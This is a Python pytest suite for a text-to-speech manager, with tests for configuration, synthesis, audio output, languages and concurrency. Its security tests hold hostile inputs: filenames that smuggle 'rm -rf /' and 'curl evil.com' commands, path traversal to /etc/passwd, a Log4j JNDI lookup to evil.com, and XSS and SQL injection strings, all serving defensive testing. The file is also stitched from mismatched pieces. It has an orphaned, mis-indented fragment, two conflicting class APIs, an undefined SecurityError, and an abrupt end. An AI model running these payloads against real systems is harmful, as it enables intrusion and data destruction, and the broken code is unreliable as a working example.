"""
Comprehensive unit tests for TTS Manager.
Testing Framework: pytest
"""

import pytest
import asyncio
import unittest.mock as mock
from unittest.mock import Mock, AsyncMock, patch, MagicMock, call
import tempfile
import os
import json
import time
from pathlib import Path
from typing import Dict, List, Any, Optional

# Import TTS manager and related classes
# Note: Adjust imports based on actual implementation structure
try:
    from CharacterClient.tts_manager import TTSManager, TTSConfig, AudioFormat
    from CharacterClient.exceptions import TTSError, AudioError, ConfigurationError
except ImportError:
    # Create mock classes for testing if imports fail
    class TTSManager:
        def __init__(self, config=None):
            self.config = config or {}
        
        def synthesize_speech(self, text: str) -> bytes:
            return b'mock_audio_data'
        
        def save_audio(self, text: str, filepath: str) -> None:
            pass
    
    class TTSError(Exception):
        pass
    
    class AudioError(Exception):
        pass
    
    class ConfigurationError(Exception):
        pass


class TestTTSManagerInitialization:
    """Test TTS Manager initialization and configuration."""
    
    def test_default_initialization(self):
        """Test TTS manager initializes with default settings."""
        tts_manager = TTSManager()
        assert tts_manager is not None
        assert hasattr(tts_manager, 'config')
    
    def test_custom_config_initialization(self):
        """Test TTS manager initializes with custom configuration."""
        config = {
            'voice': 'en-US-AriaNeural',
            'speed': 1.2,
            'pitch': 1.0,
            'volume': 0.8,
            'format': 'wav'
        }
        tts_manager = TTSManager(config=config)
        assert tts_manager.config.get('voice') == 'en-US-AriaNeural'
        assert tts_manager.config.get('speed') == 1.2
    
    @pytest.mark.parametrize("invalid_config,expected_error", [
        ({'speed': -1.0}, (ValueError, ConfigurationError)),
        ({'speed': 5.0}, (ValueError, ConfigurationError)),
        ({'pitch': -3.0}, (ValueError, ConfigurationError)),
        ({'pitch': 4.0}, (ValueError, ConfigurationError)),
        ({'volume': -0.1}, (ValueError, ConfigurationError)),
        ({'volume': 2.0}, (ValueError, ConfigurationError)),
        ({'format': 'invalid_format'}, (ValueError, ConfigurationError)),
    ])
    def test_invalid_config_validation(self, invalid_config, expected_error):
        """Test TTS manager validates configuration parameters."""
        with pytest.raises(expected_error):
            TTSManager(config=invalid_config)
    
    def test_config_merge_with_defaults(self):
        """Test configuration merges with default values."""
        partial_config = {'voice': 'custom_voice'}
        tts_manager = TTSManager(config=partial_config)
        
        # Should have custom voice but default other values
        assert tts_manager.config.get('voice') == 'custom_voice'
        # Assuming default speed exists
        assert 'speed' in tts_manager.config or hasattr(tts_manager, '_default_speed')


class TestTTSManagerTextProcessing:
    """Test text processing and synthesis functionality."""
    
    @pytest.fixture
    def tts_manager(self):
        """Create a TTS manager instance for testing."""
        return TTSManager()
    
    def test_synthesize_simple_text(self, tts_manager):
        """Test synthesizing speech from simple text."""
        text = "Hello, world!"
        with patch.object(tts_manager, 'synthesize_speech', return_value=b'fake_audio') as mock_synth:
            result = tts_manager.synthesize_speech(text)
            assert result == b'fake_audio'
            mock_synth.assert_called_once_with(text)
    
    @pytest.mark.parametrize("invalid_input", [
        "",           # Empty string
        None,         # None value
        123,          # Non-string type
        [],           # List
        {},           # Dictionary
    ])
    def test_synthesize_invalid_input(self, tts_manager, invalid_input):
        """Test synthesizing speech with invalid inputs."""
        with pytest.raises((ValueError, TypeError, TTSError)):
            tts_manager.synthesize_speech(invalid_input)
    
    def test_synthesize_very_long_text(self, tts_manager):
        """Test synthesizing speech with very long text."""
        long_text = "This is a test sentence. " * 1000
        with patch.object(tts_manager, 'synthesize_speech', return_value=b'long_audio') as mock_synth:
            result = tts_manager.synthesize_speech(long_text)
            assert result is not None
            assert len(result) > 0
    
    @pytest.mark.parametrize("special_text", [
        "Hello! How are you? I'm fine.",
        "Test with numbers: 123 456 789",
        "Special chars: @#$%^&*()",
        "Unicode: café naïve résumé",
        "URLs: https://example.com/path?param=value",
        "Email: test@example.com",
        "Phone: +1-555-123-4567",
        "Multiple\nlines\nof\ntext",
    ])
    def test_synthesize_special_characters(self, tts_manager, special_text):
        """Test synthesizing speech with special characters and formats."""
        with patch.object(tts_manager, 'synthesize_speech', return_value=b'special_audio') as mock_synth:
            result = tts_manager.synthesize_speech(special_text)
            assert result is not None
    
    def test_text_preprocessing(self, tts_manager):
        """Test text preprocessing functionality."""
        if hasattr(tts_manager, 'preprocess_text'):
            test_cases = [
                ("Hello\n\nworld", "Hello world"),
                ("Multiple   spaces", "Multiple spaces"),
                ("CAPS LOCK TEXT", "CAPS LOCK TEXT"),  # May or may not be lowercased
                ("Tabs\t\tand\tspaces", "Tabs and spaces"),
            ]
            
            for input_text, expected_pattern in test_cases:
                result = tts_manager.preprocess_text(input_text)
                assert isinstance(result, str)
                assert len(result.strip()) > 0
    
    def test_text_chunking_for_long_input(self, tts_manager):
        """Test text chunking for very long inputs."""
        if hasattr(tts_manager, 'chunk_text'):
            very_long_text = "This is a test sentence. " * 500
            chunks = tts_manager.chunk_text(very_long_text, max_length=1000)
            
            assert isinstance(chunks, list)
            assert len(chunks) > 1
            for chunk in chunks:
                assert len(chunk) <= 1000
                assert isinstance(chunk, str)


class TestTTSManagerAudioOutput:
    """Test audio output functionality."""
    
    @pytest.fixture
    def tts_manager(self):
        return TTSManager()
    
    def test_save_audio_to_file(self, tts_manager):
        """Test saving synthesized audio to file."""
        text = "Test audio save"
        audio_data = b'fake_audio_data'
        
        with tempfile.NamedTemporaryFile(suffix='.wav', delete=False) as temp_file:
            temp_path = temp_file.name
        
        try:
            with patch.object(tts_manager, 'synthesize_speech', return_value=audio_data):
                tts_manager.save_audio(text, temp_path)
                
                assert os.path.exists(temp_path)
                assert os.path.getsize(temp_path) > 0
        finally:
            if os.path.exists(temp_path):
                os.unlink(temp_path)
    
    @pytest.mark.parametrize("invalid_path", [
        "/invalid/path/that/does/not/exist/audio.wav",
        "",
        None,
        "/root/protected/path.wav",  # Permission denied
    ])
    def test_save_audio_invalid_paths(self, tts_manager, invalid_path):
        """Test saving audio to invalid paths raises appropriate errors."""
        with pytest.raises((IOError, OSError, AudioError, ValueError, TypeError)):
            tts_manager.save_audio("Test text", invalid_path)
    
    def test_get_supported_formats(self, tts_manager):
        """Test getting supported audio formats."""
        if hasattr(tts_manager, 'get_supported_formats'):
            formats = tts_manager.get_supported_formats()
            assert isinstance(formats, (list, tuple, set))
            assert len(formats) > 0
            
            # Common formats should be strings
            for format_type in formats:
                assert isinstance(format_type, str)
                assert len(format_type) > 0
    
    @pytest.mark.parametrize("audio_format", ['wav', 'mp3', 'ogg', 'flac'])
    def test_audio_format_conversion(self, tts_manager, audio_format):
        """Test audio format conversion functionality."""
        if hasattr(tts_manager, 'convert_format'):
            audio_data = b'fake_audio_data'
            
            try:
                result = tts_manager.convert_format(audio_data, audio_format)
                assert isinstance(result, bytes)
                assert len(result) > 0
            except (NotImplementedError, ValueError):
                # Format might not be supported
                pytest.skip(f"Format {audio_format} not supported")
    
    def test_audio_quality_settings(self, tts_manager):
        """Test audio quality and bitrate settings."""
        if hasattr(tts_manager, 'set_audio_quality'):
            quality_levels = ['low', 'medium', 'high']
            
            for quality in quality_levels:
                try:
                    tts_manager.set_audio_quality(quality)
                    if hasattr(tts_manager, 'get_audio_quality'):
                        assert tts_manager.get_audio_quality() == quality
                except (ValueError, NotImplementedError):
                    # Quality setting might not be supported
                    pass


        mock_tts_instance = Mock()
        mock_coqui.return_value = mock_tts_instance
        mock_to_thread.return_value = None
        
        manager = TTSManager(
            tts_service_name="xttsv2",
            model_name="test_model"
        )
        
        result = await manager.synthesize("Hello world", "test_output.wav", "/path/to/speaker.wav")
        
        assert result == "/tmp/test_audio/test_output.wav"
        mock_to_thread.assert_called_once()
        
    @patch('tts_manager.ensure_client_directories')
    async def test_synthesize_not_initialized(self, mock_ensure_dirs, capsys):
        """Test async synthesis when not initialized"""
        manager = TTSManager(tts_service_name="unsupported")
        result = await manager.synthesize("Hello world", "test_output.wav")
        
        assert result is None
        captured = capsys.readouterr()
        assert "Not initialized" in captured.out
        
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    @patch('asyncio.to_thread')
    async def test_synthesize_exception_handling(self, mock_to_thread, mock_gtts, mock_ensure_dirs, capsys):
        """Test async synthesis exception handling"""
        mock_to_thread.side_effect = Exception("Synthesis failed")
        
        manager = TTSManager(tts_service_name="gtts")
        result = await manager.synthesize("Hello world", "test_output.mp3")
        
        assert result is None
        captured = capsys.readouterr()
        assert "Error during async TTS synthesis" in captured.out
        
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    @patch('asyncio.to_thread')
    @patch('os.path.exists', return_value=True)
    @patch('os.remove')
    async def test_synthesize_cleanup_on_error(self, mock_remove, mock_exists, mock_to_thread, mock_gtts, mock_ensure_dirs):
        """Test file cleanup on synthesis error"""
        mock_to_thread.side_effect = Exception("Synthesis failed")
        
        manager = TTSManager(tts_service_name="gtts")
        await manager.synthesize("Hello world", "test_output.mp3")
        
        mock_remove.assert_called_once()
        
    @patch('tts_manager.ensure_client_directories')
    async def test_synthesize_unsupported_service(self, mock_ensure_dirs, capsys):
        """Test async synthesis with unsupported service"""
        manager = TTSManager(tts_service_name="unsupported")
        manager.is_initialized = True  # Force initialized state
        manager.tts_instance = Mock()
        
        result = await manager.synthesize("Hello world", "test_output.wav")
        
        assert result is None
        captured = capsys.readouterr()
        assert "No async synthesis method" in captured.out


class TestTTSManagerStaticMethods:
    """Test suite for static methods"""
    
    @patch('tts_manager.gtts')
    @patch('tts_manager.CoquiTTS')
    def test_list_services_both_available(self, mock_coqui, mock_gtts):
        """Test listing services when both are available"""
        services = TTSManager.list_services()
        assert "gtts" in services
        assert "xttsv2" in services
        assert len(services) == 2
        
    @patch('tts_manager.gtts')
    @patch('tts_manager.CoquiTTS', None)
    def test_list_services_only_gtts(self, mock_gtts):
        """Test listing services when only gTTS is available"""
        services = TTSManager.list_services()
        assert "gtts" in services
        assert "xttsv2" not in services
        assert len(services) == 1
        
    @patch('tts_manager.gtts', None)
    @patch('tts_manager.CoquiTTS')
    def test_list_services_only_xttsv2(self, mock_coqui):
        """Test listing services when only XTTSv2 is available"""
        services = TTSManager.list_services()
        assert "gtts" not in services
        assert "xttsv2" in services
        assert len(services) == 1
        
    @patch('tts_manager.gtts', None)
    @patch('tts_manager.CoquiTTS', None)
    def test_list_services_none_available(self):
        """Test listing services when none are available"""
        services = TTSManager.list_services()
        assert len(services) == 0
        
    def test_get_available_models_gtts(self):
        """Test getting available models for gTTS"""
        models = TTSManager.get_available_models("gtts")
        assert models == ["N/A (uses language codes)"]
        
    def test_get_available_models_xttsv2(self):
        """Test getting available models for XTTSv2"""
        models = TTSManager.get_available_models("xttsv2")
        assert "tts_models/multilingual/multi-dataset/xtts_v2" in models
        
    def test_get_available_models_unsupported(self):
        """Test getting available models for unsupported service"""
        models = TTSManager.get_available_models("unsupported")
        assert models == []


class TestTTSManagerModelHandling:
    """Test suite for model handling functionality"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.CLIENT_TTS_MODELS_PATH', '/tmp/test_models')
    @patch('os.makedirs')
    def test_get_or_download_model_blocking_xttsv2(self, mock_makedirs, mock_ensure_dirs):
        """Test model handling for XTTSv2"""
        manager = TTSManager(tts_service_name="gtts")  # Any service for testing
        result = manager._get_or_download_model_blocking("xttsv2", "test_model")
        
        assert result == "test_model"
        mock_makedirs.assert_called()
        
    @patch('tts_manager.ensure_client_directories')
    def test_get_or_download_model_blocking_unsupported(self, mock_ensure_dirs):
        """Test model handling for unsupported service"""
        manager = TTSManager(tts_service_name="gtts")
        result = manager._get_or_download_model_blocking("unsupported", "test_model")
        
        assert result is None


class TestTTSManagerEdgeCases:
    """Test suite for edge cases and error conditions"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_synthesize_empty_text(self, mock_gtts, mock_ensure_dirs):
        """Test synthesis with empty text"""
        manager = TTSManager(tts_service_name="gtts")
        
        with patch('asyncio.to_thread') as mock_to_thread:
            result = await manager.synthesize("", "output.mp3")
            # Should still attempt synthesis - TTS service handles empty text
            mock_to_thread.assert_called_once()
            
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_synthesize_very_long_text(self, mock_gtts, mock_ensure_dirs):
        """Test synthesis with very long text"""
        long_text = "A" * 10000
        manager = TTSManager(tts_service_name="gtts")
        
        with patch('asyncio.to_thread') as mock_to_thread:
            await manager.synthesize(long_text, "output.mp3")
            mock_to_thread.assert_called_once()
            
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_synthesize_special_characters(self, mock_gtts, mock_ensure_dirs):
        """Test synthesis with special characters"""
        special_text = "Hello! 👋 How are you? 🤔 Fine, thanks! 😊"
        manager = TTSManager(tts_service_name="gtts")
        
        with patch('asyncio.to_thread') as mock_to_thread:
            await manager.synthesize(special_text, "output.mp3")
            mock_to_thread.assert_called_once()
            
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_synthesize_none_filename(self, mock_gtts, mock_ensure_dirs):
        """Test synthesis with None filename"""
        manager = TTSManager(tts_service_name="gtts")
        
        # This should raise an exception due to os.path.join with None
        with pytest.raises((TypeError, AttributeError)):
            await manager.synthesize("Hello", None)
            
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_synthesize_invalid_filename(self, mock_gtts, mock_ensure_dirs):
        """Test synthesis with invalid filename characters"""
        manager = TTSManager(tts_service_name="gtts")
        invalid_filename = "output<>:\"|?*.mp3"
        
        with patch('asyncio.to_thread') as mock_to_thread:
            await manager.synthesize("Hello", invalid_filename)
            # Should still attempt - OS handles invalid filenames
            mock_to_thread.assert_called_once()


class TestTTSManagerLanguageHandling:
    """Test suite for language-specific functionality"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    def test_initialization_various_languages(self, mock_gtts, mock_ensure_dirs):
        """Test initialization with various language codes"""
        languages = ["en", "es", "fr", "de", "it", "pt", "ru", "ja", "ko", "zh"]
        
        for lang in languages:
            manager = TTSManager(tts_service_name="gtts", language=lang)
            assert manager.language == lang
            
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    def test_initialization_invalid_language_code(self, mock_gtts, mock_ensure_dirs):
        """Test initialization with invalid language code"""
        manager = TTSManager(tts_service_name="gtts", language="invalid_lang")
        assert manager.language == "invalid_lang"  # Should accept any string
        
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    def test_initialization_empty_language(self, mock_gtts, mock_ensure_dirs):
        """Test initialization with empty language string"""
        manager = TTSManager(tts_service_name="gtts", language="")
        assert manager.language == "en"  # Should default to "en"


class TestTTSManagerConcurrency:
    """Test suite for concurrent operations"""
    
    @patch('tts_manager.ensure_client_directories')  
    @patch('tts_manager.gtts')
    async def test_concurrent_synthesis_requests(self, mock_gtts, mock_ensure_dirs):
        """Test handling multiple concurrent synthesis requests"""
        manager = TTSManager(tts_service_name="gtts")
        
        with patch('asyncio.to_thread') as mock_to_thread:
            mock_to_thread.return_value = None
            
            # Create multiple concurrent synthesis tasks
            tasks = []
            for i in range(5):
                task = manager.synthesize(f"Text {i}", f"output_{i}.mp3")
                tasks.append(task)
                
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # All should complete successfully
            assert len(results) == 5
            assert all(r is not None for r in results if not isinstance(r, Exception))
            assert mock_to_thread.call_count == 5


class TestTTSManagerFileSystemOperations:
    """Test suite for file system related operations"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    @patch('os.makedirs', side_effect=PermissionError("Permission denied"))
    async def test_synthesize_makedirs_permission_error(self, mock_makedirs, mock_gtts, mock_ensure_dirs):
        """Test synthesis when directory creation fails due to permissions"""
        manager = TTSManager(tts_service_name="gtts")
        
        with pytest.raises(PermissionError):
            await manager.synthesize("Hello", "output.mp3")
            
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    @patch('os.remove', side_effect=OSError("Removal failed"))
    @patch('os.path.exists', return_value=True)
    @patch('asyncio.to_thread', side_effect=Exception("Synthesis failed"))
    async def test_synthesize_cleanup_failure(self, mock_to_thread, mock_exists, mock_remove, mock_gtts, mock_ensure_dirs):
        """Test synthesis cleanup when file removal fails"""
        manager = TTSManager(tts_service_name="gtts")
        
        # Should not raise exception even if cleanup fails
        result = await manager.synthesize("Hello", "output.mp3")
        assert result is None
        mock_remove.assert_called_once()


if __name__ == "__main__":
    pytest.main([__file__, "-v"])

class TestTTSManagerPerformance:
    """Test suite for performance and resource management"""
    
    @pytest.fixture
    def tts_manager(self):
        return TTSManager(tts_service_name="gtts")
    
    def test_memory_usage_with_large_texts(self, tts_manager):
        """Test memory efficiency with large text inputs."""
        try:
            import psutil
            import os
            
            process = psutil.Process(os.getpid())
            initial_memory = process.memory_info().rss
            
            # Generate large text input
            large_text = "This is a very long text that will be used for testing. " * 1000
            
            with patch('asyncio.to_thread') as mock_to_thread:
                mock_to_thread.return_value = None
                for _ in range(10):
                    asyncio.run(tts_manager.synthesize(large_text, "test.mp3"))
            
            final_memory = process.memory_info().rss
            memory_increase = final_memory - initial_memory
            
            # Memory increase should be reasonable (less than 100MB for this test)
            assert memory_increase < 100 * 1024 * 1024
        except ImportError:
            pytest.skip("psutil not available for memory testing")
    
    def test_synthesis_speed_benchmark(self, tts_manager):
        """Test synthesis speed for performance regression."""
        text = "This is a benchmark test for TTS synthesis speed."
        
        with patch('asyncio.to_thread') as mock_to_thread:
            mock_to_thread.return_value = None
            start_time = time.time()
            
            async def run_benchmarks():
                tasks = [tts_manager.synthesize(text, f"output_{i}.mp3") for i in range(10)]
                await asyncio.gather(*tasks)
            
            asyncio.run(run_benchmarks())
            end_time = time.time()
        
        # Should complete 10 synthesis calls in reasonable time
        total_time = end_time - start_time
        assert total_time < 5.0
        assert mock_to_thread.call_count == 10
    
    @pytest.mark.parametrize("text_length", [10, 100, 1000, 10000])
    async def test_synthesis_scaling_with_text_length(self, tts_manager, text_length):
        """Test synthesis performance scales reasonably with text length."""
        text = "A" * text_length
        
        with patch('asyncio.to_thread') as mock_to_thread:
            mock_to_thread.return_value = None
            start_time = time.time()
            result = await tts_manager.synthesize(text, "scaling_test.mp3")
            end_time = time.time()
            
            # Execution time should be reasonable regardless of text length for mocked calls
            execution_time = end_time - start_time
            assert execution_time < 1.0
            mock_to_thread.assert_called_once()


class TestTTSManagerConfigurationValidation:
    """Test suite for configuration validation and edge cases"""
    
    @pytest.mark.parametrize("service_name,model_name,language,should_succeed", [
        ("gtts", None, "en", True),
        ("gtts", None, "es", True),
        ("gtts", None, "fr", True),
        ("xttsv2", "tts_models/multilingual/multi-dataset/xtts_v2", "en", True),
        ("xttsv2", None, "en", True),  # Should use default
        ("invalid_service", None, "en", True),  # Should initialize but not be usable
        ("", None, "en", True),  # Empty service name
        ("gtts", "", "", True),  # Empty strings should default
    ])
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    def test_initialization_parameter_combinations(self, mock_gtts, mock_ensure_dirs, 
                                                  service_name, model_name, language, should_succeed):
        """Test various parameter combinations during initialization."""
        if should_succeed:
            manager = TTSManager(
                tts_service_name=service_name,
                model_name=model_name,
                language=language
            )
            assert manager is not None
            assert manager.service_name == service_name
            assert manager.language == (language or "en")
        else:
            with pytest.raises((ValueError, TypeError)):
                TTSManager(
                    tts_service_name=service_name,
                    model_name=model_name,
                    language=language
                )
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    def test_speaker_wav_path_validation(self, mock_gtts, mock_ensure_dirs):
        """Test speaker WAV path validation and handling."""
        test_cases = [
            ("/valid/path/speaker.wav", True),
            ("", True),  # Empty path should be handled
            (None, True),  # None should be handled
            ("invalid_path", True),  # Should not fail at init, but at synthesis
            ("../../../etc/passwd", True),  # Path traversal - should be handled safely
        ]
        
        for speaker_path, should_succeed in test_cases:
            if should_succeed:
                manager = TTSManager(
                    tts_service_name="xttsv2",
                    speaker_wav_path=speaker_path
                )
                assert manager.speaker_wav_path == (speaker_path or "")
            else:
                with pytest.raises((ValueError, SecurityError)):
                    TTSManager(
                        tts_service_name="xttsv2",
                        speaker_wav_path=speaker_path
                    )
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.os.makedirs', side_effect=OSError("Permission denied"))
    def test_initialization_with_directory_creation_failure(self, mock_makedirs, mock_ensure_dirs):
        """Test initialization when directory creation fails."""
        # Should handle directory creation failures gracefully
        manager = TTSManager(tts_service_name="gtts")
        assert manager is not None
        # May or may not be initialized depending on implementation


class TestTTSManagerErrorRecovery:
    """Test suite for error recovery and resilience"""
    
    @pytest.fixture
    def tts_manager(self):
        return TTSManager(tts_service_name="gtts")
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_recovery_after_synthesis_failure(self, mock_gtts, mock_ensure_dirs, tts_manager):
        """Test recovery after synthesis failure."""
        call_count = 0
        
        def failing_then_succeeding(*args, **kwargs):
            nonlocal call_count
            call_count += 1
            if call_count == 1:
                raise Exception("Temporary synthesis failure")
            return None
        
        with patch('asyncio.to_thread', side_effect=failing_then_succeeding):
            # First call should fail
            result1 = await tts_manager.synthesize("Test text", "output1.mp3")
            assert result1 is None
            
            # Second call should not raise an exception
            result2 = await tts_manager.synthesize("Test text", "output2.mp3")
            # Result depends on implementation, but should not crash
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_graceful_handling_of_file_system_errors(self, mock_gtts, mock_ensure_dirs, tts_manager):
        """Test graceful handling of file system errors."""
        with patch('os.makedirs', side_effect=PermissionError("Permission denied")):
            result = await tts_manager.synthesize("Test text", "protected/output.mp3")
            assert result is None  # Should fail gracefully
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_cleanup_on_interrupted_synthesis(self, mock_gtts, mock_ensure_dirs, tts_manager):
        """Test cleanup when synthesis is interrupted."""
        with patch('asyncio.to_thread', side_effect=KeyboardInterrupt("User interrupted")):
            with patch('os.path.exists', return_value=True):
                with patch('os.remove') as mock_remove:
                    try:
                        await tts_manager.synthesize("Test text", "interrupted.mp3")
                    except KeyboardInterrupt:
                        pass
                    # Cleanup should still be attempted
                    # Implementation may or may not call remove


class TestTTSManagerAccessibility:
    """Test suite for accessibility features"""
    
    @pytest.fixture
    def tts_manager(self):
        return TTSManager(tts_service_name="gtts")
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_special_character_handling(self, mock_gtts, mock_ensure_dirs, tts_manager):
        """Test handling of special characters and markup."""
        special_texts = [
            "Text with <emphasis>HTML-like</emphasis> tags",
            "Mathematical expressions: x² + y² = z²",
            "Phonetic notation: /həˈloʊ wɝld/",
            "Currency symbols: $100, €50, ¥1000",
            "Punctuation test: Hello! How are you? I'm fine...",
            "Quotation marks: 'single' and \"double\" quotes",
        ]
        
        with patch('asyncio.to_thread') as mock_to_thread:
            mock_to_thread.return_value = None
            
            for text in special_texts:
                result = await tts_manager.synthesize(text, f"special_{hash(text)}.mp3")
                # Should handle special characters without crashing
                mock_to_thread.assert_called()
                mock_to_thread.reset_mock()
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    @pytest.mark.parametrize("language_code", [
        "en", "es", "fr", "de", "it", "pt", "ru", "ja", "ko", "zh", "ar", "hi"
    ])
    async def test_multilingual_support(self, mock_gtts, mock_ensure_dirs, language_code):
        """Test multilingual text synthesis."""
        manager = TTSManager(tts_service_name="gtts", language=language_code)
        test_text = "Hello world in different languages"
        
        with patch('asyncio.to_thread') as mock_to_thread:
            mock_to_thread.return_value = None
            result = await manager.synthesize(test_text, f"multilingual_{language_code}.mp3")
            mock_to_thread.assert_called_once()
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_long_text_handling(self, mock_gtts, mock_ensure_dirs, tts_manager):
        """Test handling of very long text inputs."""
        # Create a very long text
        long_text = " ".join([f"Sentence number {i} in a very long document." for i in range(1000)])
        
        with patch('asyncio.to_thread') as mock_to_thread:
            mock_to_thread.return_value = None
            result = await tts_manager.synthesize(long_text, "long_text.mp3")
            mock_to_thread.assert_called_once()


class TestTTSManagerSecurity:
    """Test suite for security considerations"""
    
    @pytest.fixture
    def tts_manager(self):
        return TTSManager(tts_service_name="gtts")
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_malicious_filename_injection_prevention(self, mock_gtts, mock_ensure_dirs, tts_manager):
        """Test prevention of malicious filename injection."""
        malicious_filenames = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "output.mp3; rm -rf /",
            "output.mp3 && curl evil.com",
            "$(curl evil.com)",
            "`curl evil.com`",
            "output.mp3|curl evil.com",
        ]
        
        with patch('asyncio.to_thread') as mock_to_thread:
            mock_to_thread.return_value = None
            
            for malicious_filename in malicious_filenames:
                try:
                    result = await tts_manager.synthesize("Test text", malicious_filename)
                    # Should either handle safely or raise appropriate error
                except (ValueError, OSError, SecurityError):
                    # Raising security-related errors is acceptable
                    pass
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_input_sanitization(self, mock_gtts, mock_ensure_dirs, tts_manager):
        """Test input sanitization for malicious content."""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com/a}",  # Log4j injection
            "javascript:alert('xss')",
            "\x00\x01\x02\x03",  # Control characters
        ]
        
        with patch('asyncio.to_thread') as mock_to_thread:
            mock_to_thread.return_value = None
            
            for malicious_input in malicious_inputs:
                try:
                    result = await tts_manager.synthesize(malicious_input, "output.mp3")
                    # Should handle malicious input safely
                    mock_to_thread.assert_called()
                except (ValueError, SecurityError):
                    # Raising errors for malicious input is acceptable
                    pass
                mock_to_thread.reset_mock()
    
    @patch('tts_manager.ensure_client_directories') 
    @patch('tts_manager.gtts')
    async def test_resource_exhaustion_protection(self, mock_gtts, mock_ensure_dirs, tts_manager):
        """Test protection against resource exhaustion attacks."""
        # Test with extremely large input
        huge_text = "A" * (1024 * 1024)  # 1MB of text
        
        with patch('asyncio.to_thread') as mock_to_thread:
            mock_to_thread.return_value = None
            
            start_time = time.time()
            try:
                result = await tts_manager.synthesize(huge_text, "huge_output.mp3")
                end_time = time.time()
                
                # Should not take excessive time
                assert end_time - start_time < 30.0
            except (ValueError, MemoryError):
                # Acceptable to reject overly large inputs
                pass


class TestTTSManagerIntegration:
    """Integration test suite for TTS Manager with real-world scenarios"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_unicode_text_handling(self, mock_gtts, mock_ensure_dirs):
        """Test handling of various Unicode text inputs."""
        unicode_texts = [
            ("English text", "en"),
            ("Texto en español", "es"),
            ("Texte en français", "fr"),
            ("Deutscher Text", "de"),
            ("Русский текст", "ru"),
            ("中文文本", "zh"),
            ("日本語のテキスト", "ja"),
            ("한국어 텍스트", "ko"),
            ("النص العربي", "ar"),
            ("🎵 Music and emojis 🎶", "en"),
            ("Math symbols: ∑ ∆ ∫ √", "en"),
        ]
        
        for text, lang in unicode_texts:
            manager = TTSManager(tts_service_name="gtts", language=lang)
            
            with patch('asyncio.to_thread') as mock_to_thread:
                mock_to_thread.return_value = None
                try:
                    result = await manager.synthesize(text, f"unicode_{lang}.mp3")
                    mock_to_thread.assert_called_once()
                except (UnicodeError, ValueError):
                    # Some Unicode might not be supported
                    continue
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_concurrent_synthesis_different_languages(self, mock_gtts, mock_ensure_dirs):
        """Test concurrent synthesis with different languages."""
        language_texts = [
            ("Hello world", "en"),
            ("Hola mundo", "es"), 
            ("Bonjour monde", "fr"),
            ("Hallo Welt", "de"),
            ("Ciao mondo", "it"),
        ]
        
        async def synthesize_language(text, lang):
            manager = TTSManager(tts_service_name="gtts", language=lang)
            with patch('asyncio.to_thread') as mock_to_thread:
                mock_to_thread.return_value = None
                return await manager.synthesize(text, f"concurrent_{lang}.mp3")
        
        # Run concurrent synthesis
        tasks = [synthesize_language(text, lang) for text, lang in language_texts]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # All should complete without interference
        assert len(results) == len(language_texts)
    
    @patch('tts_manager.ensure_client_directories')
    def test_service_availability_detection(self, mock_ensure_dirs):
        """Test detection of available TTS services."""
        available_services = TTSManager.list_services()
        assert isinstance(available_services, list)
        
        # Test with each available service
        for service in available_services:
            manager = TTSManager(tts_service_name=service)
            assert manager.service_name == service
    
    @patch('tts_manager.ensure_client_directories')
    def test_model_availability_for_services(self, mock_ensure_dirs):
        """Test model availability for different services."""
        services = ["gtts", "xttsv2", "unsupported_service"]
        
        for service in services:
            models = TTSManager.get_available_models(service)
            assert isinstance(models, list)
            
            if service == "gtts":
                assert "N/A (uses language codes)" in models
            elif service == "xttsv2":
                assert any("xtts" in model.lower() for model in models)
            else:
                assert len(models) == 0


class TestTTSManagerFileOperations:
    """Test suite for file operations and path handling"""
    
    @pytest.fixture
    def tts_manager(self):
        return TTSManager(tts_service_name="gtts")
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_output_directory_creation(self, mock_gtts, mock_ensure_dirs, tts_manager):
        """Test automatic creation of output directories."""
        with patch('os.makedirs') as mock_makedirs:
            with patch('asyncio.to_thread') as mock_to_thread:
                mock_to_thread.return_value = None
                
                nested_path = "level1/level2/level3/output.mp3"
                await tts_manager.synthesize("Test text", nested_path)
                
                # Should attempt to create directories
                mock_makedirs.assert_called()
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_file_cleanup_on_failure(self, mock_gtts, mock_ensure_dirs, tts_manager):
        """Test file cleanup when synthesis fails."""
